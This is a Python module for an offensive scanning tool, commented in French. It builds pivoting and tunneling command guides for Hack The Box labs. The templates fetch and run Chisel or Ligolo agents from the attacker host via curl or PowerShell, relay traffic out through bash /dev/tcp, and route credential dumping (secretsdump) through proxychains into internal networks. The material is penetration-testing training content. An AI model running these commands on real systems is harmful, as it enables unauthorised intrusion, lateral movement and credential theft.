"""
ChocoScan — Pivot Helper.

Génère les commandes complètes de pivoting et tunneling réseau
selon les services et sous-réseaux détectés dans le scan.

Méthodes couvertes :
  SSH local/remote/dynamic port forwarding
  Chisel (HTTP tunnel — fonctionne sans SSH)
  Ligolo-ng (tunnel transparent avec interface TUN — le meilleur)
  Socat relay (simple, sans outil externe si disponible)
  sshuttle (VPN-like sur SSH)

Très utile pour :
  - HTB Pro Labs (Offshore, RastaLabs, Dante, APTLabs)
  - Machines HTB avec réseau interne (ex: port 3306 non exposé)
  - Boxes nécessitant un double pivot

Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations

from dataclasses import dataclass, field


# ── Modèles ───────────────────────────────────────────────────────────────────

@dataclass
class PivotCommand:
    tool:         str           # "ssh" | "chisel" | "ligolo" | "socat" | "sshuttle"
    title:        str
    description:  str
    attacker:     list[str]     # Commandes côté attaquant (kali)
    target:       list[str]     # Commandes côté cible compromise
    notes:        list[str] = field(default_factory=list)
    requires_on_target: str = ""  # Outil requis sur la cible


@dataclass
class PivotResult:
    target:        str
    lhost:         str
    ssh_available: bool
    internal_nets: list[str]   # Sous-réseaux internes détectés
    guides:        list[PivotCommand]
    quick_start:   str          # Recommandation express (une ligne)
    notes:         list[str]


# ── Détection ─────────────────────────────────────────────────────────────────

def _detect_internal_nets(results: list[dict]) -> list[str]:
    """Cherche des indices de réseaux internes dans les résultats."""
    hints: list[str] = []
    for r in results:
        svc = r.get("service", {})
        banner = svc.get("banner", "") or ""
        # Chercher des plages RFC-1918 dans les banners
        import re
        # Cherche des IPs internes dans les banners
        private_ips = re.findall(
            r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}"
            r"|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}"
            r"|192\.168\.\d{1,3}\.\d{1,3})\b",
            banner,
        )
        for ip in private_ips:
            # Extraire le sous-réseau /24
            parts = ip.rsplit(".", 1)
            net = f"{parts[0]}.0/24"
            if net not in hints:
                hints.append(net)
    return hints


def _is_ssh_open(results: list[dict]) -> bool:
    """Vérifie si SSH est ouvert dans les résultats."""
    for r in results:
        svc = r.get("service", {})
        svc_name = svc.get("service_name", "") or ""
        port = svc.get("port", 0) or 0
        if "ssh" in svc_name.lower() or port == 22:
            return True
    return False


# ── SSH — Local Port Forward ──────────────────────────────────────────────────

def _ssh_local_forward(lhost: str, target: str, ssh_user: str = "USER",
                        ssh_port: int = 22) -> PivotCommand:
    return PivotCommand(
        tool="ssh",
        title="SSH Local Port Forward",
        description=(
            "Redirige un port interne de la cible vers ta machine. "
            "Idéal pour accéder à une BDD, un service web interne, etc."
        ),
        attacker=[
            f"# Syntax : ssh -L LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT {ssh_user}@{target}",
            "",
            f"# Exemple — accéder à MySQL interne (3306) :",
            f"ssh -L 3306:127.0.0.1:3306 {ssh_user}@{target} -p {ssh_port} -N",
            "",
            "# Puis depuis ta machine :",
            "mysql -h 127.0.0.1 -P 3306 -u root",
            "",
            f"# Exemple — accéder à un service sur un 3ème hôte (pivot) :",
            f"ssh -L 8080:INTERNAL_HOST:80 {ssh_user}@{target} -p {ssh_port} -N",
            "# → http://127.0.0.1:8080 atteint INTERNAL_HOST:80 via target",
            "",
            "# Multiple forwards en une commande :",
            f"ssh -L 8080:HOST2:80 -L 3306:HOST2:3306 {ssh_user}@{target} -N",
        ],
        target=[],
        notes=[
            "-N : ne pas ouvrir de shell (juste le tunnel)",
            "-f : passer en background",
            "-o StrictHostKeyChecking=no pour éviter les prompts",
        ],
    )


def _ssh_remote_forward(lhost: str, target: str, ssh_user: str = "USER",
                         lport: int = 4444) -> PivotCommand:
    return PivotCommand(
        tool="ssh",
        title="SSH Remote Port Forward",
        description=(
            "La cible ouvre un tunnel vers ta machine. "
            "Utile quand tu contrôles déjà la cible et veux exposer un de ses ports."
        ),
        attacker=[
            f"# Syntax : ssh -R REMOTE_PORT:localhost:LOCAL_PORT {ssh_user}@{lhost}",
            "",
            "# Sur ta machine — démarrer le serveur SSH (si pas déjà) :",
            "sudo systemctl start ssh",
            "",
            f"# Puis tu reçois la connexion sur {lhost}:{lport} :",
            f"# Accéder à → http://127.0.0.1:{lport}  (redirigé depuis la cible)",
        ],
        target=[
            f"# Exécuter SUR LA CIBLE — ouvre le tunnel retour vers toi :",
            f"ssh -R {lport}:127.0.0.1:80 USER@{lhost} -N -o StrictHostKeyChecking=no",
            "",
            "# Avec clé privée :",
            f"ssh -R {lport}:127.0.0.1:80 USER@{lhost} -i /tmp/key -N",
        ],
        notes=[
            "GatewayPorts yes dans /etc/ssh/sshd_config pour écouter sur 0.0.0.0",
        ],
    )


def _ssh_dynamic_socks(lhost: str, target: str, ssh_user: str = "USER",
                        ssh_port: int = 22, socks_port: int = 1080) -> PivotCommand:
    return PivotCommand(
        tool="ssh",
        title="SSH Dynamic — SOCKS5 Proxy",
        description=(
            "Crée un proxy SOCKS5 sur ta machine. "
            "Tout le trafic peut transiter via la cible vers son réseau interne. "
            "Compatible avec proxychains4."
        ),
        attacker=[
            f"# Ouvrir le proxy SOCKS5 sur 127.0.0.1:{socks_port} :",
            f"ssh -D {socks_port} {ssh_user}@{target} -p {ssh_port} -N -f",
            "",
            f"# Configurer /etc/proxychains4.conf :",
            "# [ProxyList]",
            f"# socks5  127.0.0.1  {socks_port}",
            "",
            "# Utiliser avec proxychains :",
            "proxychains4 nmap -sT -Pn -n INTERNAL_HOST",
            "proxychains4 curl http://INTERNAL_HOST/",
            "proxychains4 crackmapexec smb INTERNAL_RANGE",
            "proxychains4 impacket-secretsdump DOMAIN/user:pass@INTERNAL_HOST",
            "",
            "# Avec Firefox via FoxyProxy → SOCKS5 127.0.0.1:{socks_port}",
        ],
        target=[],
        notes=[
            "proxychains4 (pas proxychains) pour SOCKS5",
            "dynamic_chain dans proxychains4.conf",
            "dns_proxy pour résoudre les noms en interne",
        ],
    )


# ── Chisel ─────────────────────────────────────────────────────────────────────

def _chisel_guide(lhost: str, target: str, lport: int = 8080,
                   socks_port: int = 1080) -> PivotCommand:
    return PivotCommand(
        tool="chisel",
        title="Chisel — Tunnel HTTP/HTTPS",
        description=(
            "Tunnel chiffré via HTTP. Idéal quand SSH est absent ou filtré. "
            "Un seul binaire à déposer sur la cible. "
            "Très utilisé sur HTB."
        ),
        attacker=[
            "# Télécharger chisel (Linux/Windows) :",
            "# https://github.com/jpillora/chisel/releases",
            "",
            f"# 1. Démarrer le serveur chisel sur ta machine :",
            f"./chisel server --reverse --port {lport}",
            "",
            f"# 2. Écouter les connexions : le tunnel va s'ouvrir sur 127.0.0.1:{socks_port}",
            "",
            f"# Configurer proxychains4.conf :",
            f"# socks5  127.0.0.1  {socks_port}",
            "",
            "# Utiliser :",
            "proxychains4 nmap -sT -Pn INTERNAL_HOST",
            "proxychains4 evil-winrm -i INTERNAL_HOST -u admin -p pass",
        ],
        target=[
            "# Déposer chisel sur la cible (Linux) :",
            f"curl http://{lhost}/chisel -o /tmp/chisel && chmod +x /tmp/chisel",
            "",
            "# Ou wget / PowerShell (Windows) :",
            f"powershell -c \"iwr http://{lhost}/chisel.exe -o C:\\chisel.exe\"",
            "",
            f"# 3. Lancer le client chisel depuis la cible :",
            f"/tmp/chisel client {lhost}:{lport} R:{socks_port}:socks",
            "",
            "# Windows :",
            f"C:\\chisel.exe client {lhost}:{lport} R:{socks_port}:socks",
            "",
            "# Double pivot (cible → pivot2 → réseau interne) :",
            f"/tmp/chisel client {lhost}:{lport} R:{socks_port}:socks R:8888:PIVOT2:8888",
        ],
        notes=[
            "Héberger chisel : python3 -m http.server 80",
            "Chisel compresse automatiquement le trafic",
            "R: = reverse (client ouvre, serveur écoute)",
        ],
        requires_on_target="chisel (binaire à déposer)",
    )


# ── Ligolo-ng ──────────────────────────────────────────────────────────────────

def _ligolo_guide(lhost: str, target: str, lport: int = 11601) -> PivotCommand:
    return PivotCommand(
        tool="ligolo",
        title="Ligolo-ng — Tunnel transparent (TUN interface)",
        description=(
            "Le meilleur outil de pivoting pour le CTF. "
            "Crée une interface réseau virtuelle — pas besoin de proxychains. "
            "Nmap, ping, tous les outils fonctionnent nativement."
        ),
        attacker=[
            "# Télécharger : https://github.com/nicocha30/ligolo-ng/releases",
            "# proxy (ta machine) + agent (cible)",
            "",
            f"# 1. Démarrer le proxy ligolo :",
            f"sudo ip tuntap add user $USER mode tun ligolo",
            "sudo ip link set ligolo up",
            f"./proxy -selfcert -laddr 0.0.0.0:{lport}",
            "",
            "# 2. Dans l'interface ligolo (après connexion de l'agent) :",
            "ligolo-ng >> session         # Lister les sessions",
            "ligolo-ng >> [0] >> start    # Démarrer le tunnel",
            "",
            "# 3. Ajouter la route vers le réseau interne :",
            "sudo ip route add 192.168.X.0/24 dev ligolo",
            "",
            "# Accéder directement (sans proxychains) :",
            "nmap -sV 192.168.X.0/24",
            "curl http://192.168.X.10/",
            "evil-winrm -i 192.168.X.10 -u admin -p pass",
            "",
            "# Double pivot : ajouter un listener sur ligolo :",
            "ligolo-ng >> [0] >> listener_add --addr 0.0.0.0:1234 --to 172.16.0.5:80",
        ],
        target=[
            f"# Déposer l'agent ligolo :",
            f"curl http://{lhost}/agent -o /tmp/agent && chmod +x /tmp/agent",
            "",
            f"# Connecter l'agent au proxy :",
            f"/tmp/agent -connect {lhost}:{lport} -ignore-cert",
            "",
            "# Windows :",
            f"powershell -c \"iwr http://{lhost}/agent.exe -o C:\\agent.exe\"",
            f"C:\\agent.exe -connect {lhost}:{lport} -ignore-cert",
        ],
        notes=[
            "Interface TUN → toutes les commandes fonctionnent sans proxychains",
            "-selfcert si pas de certificat TLS",
            "Pour double pivot : listener_add dans l'interface ligolo",
            "sudo ip route del pour nettoyer",
        ],
        requires_on_target="ligolo-ng agent (binaire à déposer)",
    )


# ── Socat ──────────────────────────────────────────────────────────────────────

def _socat_guide(lhost: str, target: str, lport: int = 4444) -> PivotCommand:
    return PivotCommand(
        tool="socat",
        title="Socat — Relay de port simple",
        description=(
            "Relay simple sans outil supplémentaire si socat est déjà installé. "
            "Idéal pour rediriger un port interne vers ta machine."
        ),
        attacker=[
            f"# Écouter côté attaquant :",
            f"nc -lvnp {lport}",
            "",
            "# Ou forwarder un port local vers la cible :",
            f"socat TCP-LISTEN:{lport},fork TCP:INTERNAL_HOST:INTERNAL_PORT",
        ],
        target=[
            "# Relay simple — redirige INTERNAL_HOST:INTERNAL_PORT vers LHOST:LPORT :",
            f"socat TCP:LHOST:{lport} TCP:INTERNAL_HOST:INTERNAL_PORT &",
            "",
            "# Relay avec forking (plusieurs connexions simultanées) :",
            f"socat TCP-LISTEN:8888,fork TCP:INTERNAL_HOST:80 &",
            f"# → Accéder depuis ta machine : curl http://{target}:8888/",
            "",
            "# Si socat absent — utiliser /dev/tcp (bash) :",
            f"bash -c 'cat < /dev/tcp/INTERNAL_HOST/INTERNAL_PORT > /dev/tcp/{lhost}/{lport}' &",
        ],
        notes=[
            "Socat souvent déjà installé sur Linux",
            "Alternative si socat absent : netcat avec -e ou mkfifo",
        ],
        requires_on_target="socat (ou bash /dev/tcp)",
    )


# ── sshuttle ──────────────────────────────────────────────────────────────────

def _sshuttle_guide(lhost: str, target: str, ssh_user: str = "USER",
                     ssh_port: int = 22) -> PivotCommand:
    return PivotCommand(
        tool="sshuttle",
        title="sshuttle — VPN over SSH",
        description=(
            "Crée un VPN transparent sur SSH. "
            "Tout le trafic vers le réseau cible passe par la cible. "
            "Aucune configuration proxychains nécessaire."
        ),
        attacker=[
            "# Installer : pip install sshuttle  (ou apt install sshuttle)",
            "",
            "# Router tout le réseau 10.10.0.0/8 via la cible :",
            f"sshuttle -r {ssh_user}@{target}:{ssh_port} 10.0.0.0/8",
            "",
            "# Avec clé SSH :",
            f"sshuttle -r {ssh_user}@{target}:{ssh_port} 10.0.0.0/8 --ssh-cmd 'ssh -i ~/.ssh/id_rsa'",
            "",
            "# Router TOUT le trafic (utile pour DNS aussi) :",
            f"sshuttle -r {ssh_user}@{target}:{ssh_port} 0.0.0.0/0",
            "",
            "# Plusieurs sous-réseaux :",
            f"sshuttle -r {ssh_user}@{target}:{ssh_port} 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16",
            "",
            "# Puis accéder directement :",
            "nmap -sV INTERNAL_HOST",
            "ssh INTERNAL_USER@INTERNAL_HOST",
        ],
        target=[
            "# Rien à installer sur la cible — sshuttle gère tout via SSH.",
            "# Python3 doit être présent sur la cible (toujours le cas ou presque).",
        ],
        notes=[
            "Python3 requis sur la cible",
            "Ne pas oublier --dns pour résoudre les noms internes",
            "Ctrl+C pour couper le tunnel",
        ],
        requires_on_target="Python3",
    )


# ── Moteur principal ──────────────────────────────────────────────────────────

def generate_pivot_commands(
    results: list[dict],
    lhost: str = "LHOST",
    lport: int = 8080,
    ssh_user: str = "USER",
    ssh_port: int = 22,
) -> PivotResult:
    """
    Génère des guides de pivoting selon le contexte du scan.

    Args:
        results:  Résultats ChocoScan (liste de dicts avec clé "service").
        lhost:    IP de l'attaquant.
        lport:    Port de base utilisé pour les tunnels.
        ssh_user: Utilisateur SSH connu (si applicable).
        ssh_port: Port SSH (si non standard).

    Returns:
        PivotResult avec tous les guides et recommandations.
    """
    target = ""
    if results:
        target = results[0].get("service", {}).get("host", "TARGET") or "TARGET"

    ssh_available = _is_ssh_open(results)
    internal_nets = _detect_internal_nets(results)

    socks_port = lport + 1000 if lport < 64535 else 1080

    guides: list[PivotCommand] = []
    notes: list[str] = []

    # ── Ligolo-ng en priorité (meilleure expérience) ──────────────────────────
    guides.append(_ligolo_guide(lhost, target, lport=11601))

    # ── Chisel (HTTP tunnel) ──────────────────────────────────────────────────
    guides.append(_chisel_guide(lhost, target, lport=lport, socks_port=socks_port))

    # ── SSH si disponible ─────────────────────────────────────────────────────
    if ssh_available:
        guides.append(_ssh_dynamic_socks(lhost, target, ssh_user, ssh_port, socks_port))
        guides.append(_ssh_local_forward(lhost, target, ssh_user, ssh_port))
        guides.append(_ssh_remote_forward(lhost, target, ssh_user, lport))
        guides.append(_sshuttle_guide(lhost, target, ssh_user, ssh_port))

    # ── Socat toujours proposé ────────────────────────────────────────────────
    guides.append(_socat_guide(lhost, target, lport))

    # Recommandation express
    if ssh_available:
        quick_start = (
            f"# Recommandé : Ligolo-ng (transparent)\n"
            f"sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up\n"
            f"./proxy -selfcert -laddr 0.0.0.0:11601    # Kali\n"
            f"/tmp/agent -connect {lhost}:11601 -ignore-cert  # Cible (après upload)"
        )
    else:
        quick_start = (
            f"# SSH non détecté — Chisel recommandé :\n"
            f"./chisel server --reverse --port {lport}   # Kali\n"
            f"/tmp/chisel client {lhost}:{lport} R:{socks_port}:socks   # Cible\n"
            f"# Puis : proxychains4 nmap -sT -Pn INTERNAL_HOST"
        )

    if internal_nets:
        notes.append(f"Sous-réseaux internes détectés : {', '.join(internal_nets)}")
        notes.append("Ajouter ces routes après activation du tunnel.")
    else:
        notes.append("Aucun sous-réseau interne détecté dans le scan.")
        notes.append("Découvrir le réseau interne : ip route  /  cat /etc/hosts  /  nmap 10.x.x.0/24")

    if not ssh_available:
        notes.append("SSH non détecté — Chisel ou Ligolo-ng préférés.")

    notes += [
        "Téléchargements : https://github.com/nicocha30/ligolo-ng/releases",
        "                  https://github.com/jpillora/chisel/releases",
        "Servir les binaires : python3 -m http.server 80",
    ]

    return PivotResult(
        target=target,
        lhost=lhost,
        ssh_available=ssh_available,
        internal_nets=internal_nets,
        guides=guides,
        quick_start=quick_start,
        notes=notes,
    )
